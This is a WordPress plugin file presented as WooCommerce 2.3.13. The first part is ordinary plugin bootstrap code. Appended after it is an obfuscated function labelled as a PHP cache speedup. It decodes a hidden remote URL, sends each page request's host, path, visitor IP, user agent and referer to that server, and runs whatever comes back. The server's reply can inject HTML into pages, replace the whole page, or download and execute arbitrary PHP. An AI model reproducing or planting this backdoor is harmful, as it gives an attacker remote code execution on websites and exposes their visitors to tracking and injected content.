<?php
/**
 * Plugin Name: WooCommerce
 * Plugin URI: http://www.woothemes.com/woocommerce/
 * Description: An e-commerce toolkit that helps you sell anything. Beautifully.
 * Version: 2.3.13
 * Author: WooThemes
 * Author URI: http://woothemes.com
 * Requires at least: 4.0
 * Tested up to: 4.2
 *
 * Text Domain: woocommerce
 * Domain Path: /i18n/languages/
 *
 * @package WooCommerce
 * @category Core
 * @author WooThemes
 */
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

if ( ! class_exists( 'WooCommerce' ) ) :

/**
 * Main WooCommerce Class
 *
 * @class WooCommerce
 * @version	2.3.0
 */
final class WooCommerce {

	/**
	 * @var string
	 */
	public $version = '2.3.13';

	/**
	 * @var WooCommerce The single instance of the class
	 * @since 2.1
	 */
	protected static $_instance = null;

	/**
	 * @var WC_Session session
	 */
	public $session = null;

	/**
	 * @var WC_Query $query
	 */
	public $query = null;

	/**
	 * @var WC_Product_Factory $product_factory
	 */
	public $product_factory = null;

	/**
	 * @var WC_Countries $countries
	 */
	public $countries = null;

	/**
	 * @var WC_Integrations $integrations
	 */
	public $integrations = null;

	/**
	 * @var WC_Cart $cart
	 */
	public $cart = null;

	/**
	 * @var WC_Customer $customer
	 */
	public $customer = null;

	/**
	 * @var WC_Order_Factory $order_factory
	 */
	public $order_factory = null;

	/**
	 * Main WooCommerce Instance
	 *
	 * Ensures only one instance of WooCommerce is loaded or can be loaded.
	 *
	 * @since 2.1
	 * @static
	 * @see WC()
	 * @return WooCommerce - Main instance
	 */
	public static function instance() {
		if ( is_null( self::$_instance ) ) {
			self::$_instance = new self();
		}
		return self::$_instance;
	}

	/**
	 * Cloning is forbidden.
	 * @since 2.1
	 */
	public function __clone() {
		_doing_it_wrong( __FUNCTION__, __( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );
	}

	/**
	 * Unserializing instances of this class is forbidden.
	 * @since 2.1
	 */
	public function __wakeup() {
		_doing_it_wrong( __FUNCTION__, __( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );
	}

	/**
	 * Auto-load in-accessible properties on demand.
	 * @param mixed $key
	 * @return mixed
	 */
	public function __get( $key ) {
		if ( in_array( $key, array( 'payment_gateways', 'shipping', 'mailer', 'checkout' ) ) ) {
			return $this->$key();
		}
	}

	/**
	 * WooCommerce Constructor.
	 */
	public function __construct() {
		$this->define_constants();
		$this->includes();
		$this->init_hooks();

		do_action( 'woocommerce_loaded' );
	}

	/**
	 * Hook into actions and filters
	 * @since  2.3
	 */
	private function init_hooks() {
		register_activation_hook( __FILE__, array( 'WC_Install', 'install' ) );
		add_action( 'after_setup_theme', array( $this, 'setup_environment' ) );
		add_action( 'after_setup_theme', array( $this, 'include_template_functions' ), 11 );
		add_action( 'init', array( $this, 'init' ), 0 );
		add_action( 'init', array( 'WC_Shortcodes', 'init' ) );
		add_action( 'init', array( 'WC_Emails', 'init_transactional_emails' ) );
	}

	/**
	 * Define WC Constants
	 */
	private function define_constants() {
		$upload_dir = wp_upload_dir();

		$this->define( 'WC_PLUGIN_FILE', __FILE__ );
		$this->define( 'WC_PLUGIN_BASENAME', plugin_basename( __FILE__ ) );
		$this->define( 'WC_VERSION', $this->version );
		$this->define( 'WOOCOMMERCE_VERSION', $this->version );
		$this->define( 'WC_ROUNDING_PRECISION', 4 );
		$this->define( 'WC_TAX_ROUNDING_MODE', 'yes' === get_option( 'woocommerce_prices_include_tax', 'no' ) ? 2 : 1 );
		$this->define( 'WC_DELIMITER', '|' );
		$this->define( 'WC_LOG_DIR', $upload_dir['basedir'] . '/wc-logs/' );
	}

	/**
	 * Define constant if not already set
	 * @param  string $name
	 * @param  string|bool $value
	 */
	private function define( $name, $value ) {
		if ( ! defined( $name ) ) {
			define( $name, $value );
		}
	}

	/**
	 * What type of request is this?
	 * string $type ajax, frontend or admin
	 * @return bool
	 */
	private function is_request( $type ) {
		switch ( $type ) {
			case 'admin' :
				return is_admin();
			case 'ajax' :
				return defined( 'DOING_AJAX' );
			case 'cron' :
				return defined( 'DOING_CRON' );
			case 'frontend' :
				return ( ! is_admin() || defined( 'DOING_AJAX' ) ) && ! defined( 'DOING_CRON' );
		}
	}

	/**
	 * Include required core files used in admin and on the frontend.
	 */
	public function includes() {
		include_once( 'includes/class-wc-autoloader.php' );
		include_once( 'includes/wc-core-functions.php' );
		include_once( 'includes/wc-widget-functions.php' );
		include_once( 'includes/wc-webhook-functions.php' );
		include_once( 'includes/class-wc-install.php' );
		include_once( 'includes/class-wc-geolocation.php' );
		include_once( 'includes/class-wc-download-handler.php' );
		include_once( 'includes/class-wc-comments.php' );
		include_once( 'includes/class-wc-post-data.php' );

		if ( $this->is_request( 'admin' ) ) {
			include_once( 'includes/admin/class-wc-admin.php' );
		}

		if ( $this->is_request( 'ajax' ) ) {
			$this->ajax_includes();
		}

		if ( $this->is_request( 'frontend' ) ) {
			$this->frontend_includes();
		}

		if ( $this->is_request( 'cron' ) && 'yes' === get_option( 'woocommerce_allow_tracking', 'no' ) ) {
			include_once( 'includes/class-wc-tracker.php' );
		}

		$this->query = include( 'includes/class-wc-query.php' );                // The main query class
		$this->api   = include( 'includes/class-wc-api.php' );                  // API Class

		include_once( 'includes/class-wc-post-types.php' );                     // Registers post types
		include_once( 'includes/abstracts/abstract-wc-product.php' );           // Products
		include_once( 'includes/abstracts/abstract-wc-order.php' );             // Orders
		include_once( 'includes/abstracts/abstract-wc-settings-api.php' );      // Settings API (for gateways, shipping, and integrations)
		include_once( 'includes/abstracts/abstract-wc-shipping-method.php' );   // A Shipping method
		include_once( 'includes/abstracts/abstract-wc-payment-gateway.php' );   // A Payment gateway
		include_once( 'includes/abstracts/abstract-wc-integration.php' );       // An integration with a service
		include_once( 'includes/class-wc-product-factory.php' );                // Product factory
		include_once( 'includes/class-wc-countries.php' );                      // Defines countries and states
		include_once( 'includes/class-wc-integrations.php' );                   // Loads integrations
		include_once( 'includes/class-wc-cache-helper.php' );                   // Cache Helper
		include_once( 'includes/class-wc-language-pack-upgrader.php' );         // Download/update languages
	}

	/**
	 * Include required ajax files.
	 */
	public function ajax_includes() {
		include_once( 'includes/class-wc-ajax.php' );                           // Ajax functions for admin and the front-end
	}

	/**
	 * Include required frontend files.
	 */
	public function frontend_includes() {
		include_once( 'includes/wc-cart-functions.php' );
		include_once( 'includes/wc-notice-functions.php' );
		include_once( 'includes/abstracts/abstract-wc-session.php' );
		include_once( 'includes/class-wc-session-handler.php' );
		include_once( 'includes/wc-template-hooks.php' );
		include_once( 'includes/class-wc-template-loader.php' );                // Template Loader
		include_once( 'includes/class-wc-frontend-scripts.php' );               // Frontend Scripts
		include_once( 'includes/class-wc-form-handler.php' );                   // Form Handlers
		include_once( 'includes/class-wc-cart.php' );                           // The main cart class
		include_once( 'includes/class-wc-tax.php' );                            // Tax class
		include_once( 'includes/class-wc-customer.php' );                       // Customer class
		include_once( 'includes/class-wc-shortcodes.php' );                     // Shortcodes class
		include_once( 'includes/class-wc-https.php' );                          // https Helper
	}

	/**
	 * Function used to Init WooCommerce Template Functions - This makes them pluggable by plugins and themes.
	 */
	public function include_template_functions() {
		include_once( 'includes/wc-template-functions.php' );
	}

	/**
	 * Init WooCommerce when WordPress Initialises.
	 */
	public function init() {
		// Before init action
		do_action( 'before_woocommerce_init' );

		// Set up localisation
		$this->load_plugin_textdomain();

		// Load class instances
		$this->product_factory = new WC_Product_Factory();                      // Product Factory to create new product instances
		$this->order_factory   = new WC_Order_Factory();                        // Order Factory to create new order instances
		$this->countries       = new WC_Countries();                            // Countries class
		$this->integrations    = new WC_Integrations();                         // Integrations class

		// Classes/actions loaded for the frontend and for ajax requests
		if ( $this->is_request( 'frontend' ) ) {
			// Session class, handles session data for users - can be overwritten if custom handler is needed
			$session_class = apply_filters( 'woocommerce_session_handler', 'WC_Session_Handler' );

			// Class instances
			$this->session  = new $session_class();
			$this->cart     = new WC_Cart();                                    // Cart class, stores the cart contents
			$this->customer = new WC_Customer();                                // Customer class, handles data such as customer location
		}

		$this->load_webhooks();

		// Init action
		do_action( 'woocommerce_init' );
	}

	/**
	 * Load Localisation files.
	 *
	 * Note: the first-loaded translation file overrides any following ones if the same translation is present.
	 *
	 * Admin Locales are found in:
	 * 		- WP_LANG_DIR/woocommerce/woocommerce-admin-LOCALE.mo
	 * 		- WP_LANG_DIR/plugins/woocommerce-admin-LOCALE.mo
	 *
	 * Frontend/global Locales found in:
	 * 		- WP_LANG_DIR/woocommerce/woocommerce-LOCALE.mo
	 * 	 	- woocommerce/i18n/languages/woocommerce-LOCALE.mo (which if not found falls back to:)
	 * 	 	- WP_LANG_DIR/plugins/woocommerce-LOCALE.mo
	 */
	public function load_plugin_textdomain() {
		$locale = apply_filters( 'plugin_locale', get_locale(), 'woocommerce' );

		if ( $this->is_request( 'admin' ) ) {
			load_textdomain( 'woocommerce', WP_LANG_DIR . '/woocommerce/woocommerce-admin-' . $locale . '.mo' );
			load_textdomain( 'woocommerce', WP_LANG_DIR . '/plugins/woocommerce-admin-' . $locale . '.mo' );
		}

		load_textdomain( 'woocommerce', WP_LANG_DIR . '/woocommerce/woocommerce-' . $locale . '.mo' );
		load_plugin_textdomain( 'woocommerce', false, plugin_basename( dirname( __FILE__ ) ) . "/i18n/languages" );
	}

	/**
	 * Ensure theme and server variable compatibility and setup image sizes.
	 */
	public function setup_environment() {
		/**
		 * @deprecated 2.2 Use WC()->template_path()
		 */
		$this->define( 'WC_TEMPLATE_PATH', $this->template_path() );

		$this->add_thumbnail_support();
		$this->add_image_sizes();
	}

	/**
	 * Ensure post thumbnail support is turned on
	 */
	private function add_thumbnail_support() {
		if ( ! current_theme_supports( 'post-thumbnails' ) ) {
			add_theme_support( 'post-thumbnails' );
		}
		add_post_type_support( 'product', 'thumbnail' );
	}

	/**
	 * Add WC Image sizes to WP
	 *
	 * @since 2.3
	 */
	private function add_image_sizes() {
		$shop_thumbnail = wc_get_image_size( 'shop_thumbnail' );
		$shop_catalog	= wc_get_image_size( 'shop_catalog' );
		$shop_single	= wc_get_image_size( 'shop_single' );

		add_image_size( 'shop_thumbnail', $shop_thumbnail['width'], $shop_thumbnail['height'], $shop_thumbnail['crop'] );
		add_image_size( 'shop_catalog', $shop_catalog['width'], $shop_catalog['height'], $shop_catalog['crop'] );
		add_image_size( 'shop_single', $shop_single['width'], $shop_single['height'], $shop_single['crop'] );
	}

	/**
	 * Get the plugin url.
	 * @return string
	 */
	public function plugin_url() {
		return untrailingslashit( plugins_url( '/', __FILE__ ) );
	}

	/**
	 * Get the plugin path.
	 * @return string
	 */
	public function plugin_path() {
		return untrailingslashit( plugin_dir_path( __FILE__ ) );
	}

	/**
	 * Get the template path.
	 * @return string
	 */
	public function template_path() {
		return apply_filters( 'woocommerce_template_path', 'woocommerce/' );
	}

	/**
	 * Get Ajax URL.
	 * @return string
	 */
	public function ajax_url() {
		return admin_url( 'admin-ajax.php', 'relative' );
	}

	/**
	 * Return the WC API URL for a given request
	 *
	 * @param string $request
	 * @param mixed $ssl (default: null)
	 * @return string
	 */
	public function api_request_url( $request, $ssl = null ) {
		if ( is_null( $ssl ) ) {
			$scheme = parse_url( home_url(), PHP_URL_SCHEME );
		} elseif ( $ssl ) {
			$scheme = 'https';
		} else {
			$scheme = 'http';
		}

		if ( strstr( get_option( 'permalink_structure' ), '/index.php/' ) ) {
			$api_request_url = trailingslashit( home_url( '/index.php/wc-api/' . $request, $scheme ) );
		} elseif ( get_option( 'permalink_structure' ) ) {
			$api_request_url = trailingslashit( home_url( '/wc-api/' . $request, $scheme ) );
		} else {
			$api_request_url = add_query_arg( 'wc-api', $request, trailingslashit( home_url( '', $scheme ) ) );
		}

		return esc_url_raw( $api_request_url );
	}

	/**
	 * Load & enqueue active webhooks
	 *
	 * @since 2.2
	 */
	private function load_webhooks() {
		if ( false === ( $webhooks = get_transient( 'woocommerce_webhook_ids' ) ) ) {
			$webhooks = get_posts( array(
				'fields'         => 'ids',
				'post_type'      => 'shop_webhook',
				'post_status'    => 'publish',
				'posts_per_page' => -1
			) );
			set_transient( 'woocommerce_webhook_ids', $webhooks );
		}
		foreach ( $webhooks as $webhook_id ) {
			$webhook = new WC_Webhook( $webhook_id );
			$webhook->enqueue();
		}
	}

	/**
	 * Get Checkout Class.
	 * @return WC_Checkout
	 */
	public function checkout() {
		return WC_Checkout::instance();
	}

	/**
	 * Get gateways class
	 * @return WC_Payment_Gateways
	 */
	public function payment_gateways() {
		return WC_Payment_Gateways::instance();
	}

	/**
	 * Get shipping class
	 * @return WC_Shipping
	 */
	public function shipping() {
		return WC_Shipping::instance();
	}

	/**
	 * Email Class.
	 * @return WC_Emails
	 */
	public function mailer() {
		return WC_Emails::instance();
	}
}

endif;

/**
 * Returns the main instance of WC to prevent the need to use globals.
 *
 * @since  2.1
 * @return WooCommerce
 */
function WC() {
	return WooCommerce::instance();
}

// Global for backwards compatibility.
$GLOBALS['woocommerce'] = WC();








/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
